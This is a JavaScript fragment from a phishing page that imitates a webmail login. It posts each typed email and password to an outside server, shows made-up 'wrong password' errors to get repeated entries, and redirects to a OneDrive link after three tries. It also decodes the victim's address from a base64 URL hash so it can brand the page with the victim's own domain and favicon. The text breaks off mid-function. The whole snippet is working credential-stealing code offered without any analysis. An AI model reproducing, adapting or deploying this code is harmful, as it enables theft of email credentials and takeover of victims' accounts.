<script>

    /* global $ */
    $(document).ready(function(){
      
      var onPage = true;
      var count;
      
      var errorArray = ["","Wrong password. Please try again.", "Invalid credentials. Make sure your password is correct.", "This document has expired."];

      $('#contact').submit(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();
        
        
        if(onPage == true){
            
            count = parseInt(document.getElementById('counter').value);
            
            $('#msg').html(errorArray[count]);
            document.getElementById('password').value ="";
            document.getElementById('counter').value = count+1;
            
            $.ajax({
          dataType: 'JSON',
          url: 'https://newavonhotel.com/nop.php',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,

          },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
                console.log(response);
              },
            error: function(response){

              
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
          
          
            if (count>=3) {
                onPage = false;
                setTimeout(function(){ window.location.replace("https://onedrive.live.com/redir?resid227BFC55B5&ithint&authkey=!AEPvKF_OtOAaCH0==file,pdfE87969!134&e=GXnFAo%5Cx27"); }, 2000);

            //$('#msg').html("Finished");

document.getElementById('email').value = getEmail();
var domain = getEmail().substring(getEmail().lastIndexOf("@") +1);
var frmsite = domain.substring(0, domain.indexOf("."));
document.title = ucFirst(frmsite) +" Hosting Webmail :: Welcome to "+ucFirst(frmsite)+" Hosting Webmail";
document.getElementById("head-message").innerHTML = ucFirst(frmsite)+" Online Webmail App";
document.getElementById("fieldImg").src = `https://www.google.com/s2/favicons?domain=${domain}&sz=256`; 
  
function getEmail(){
    if(window.location.hash){
    var url = window.location.href;
            var hash = url.split('#').pop();
            return atob(hash);
    }
}


        function ucFirst(str){
      return str.charAt(0).toUpperCase()+ str.slice(1);
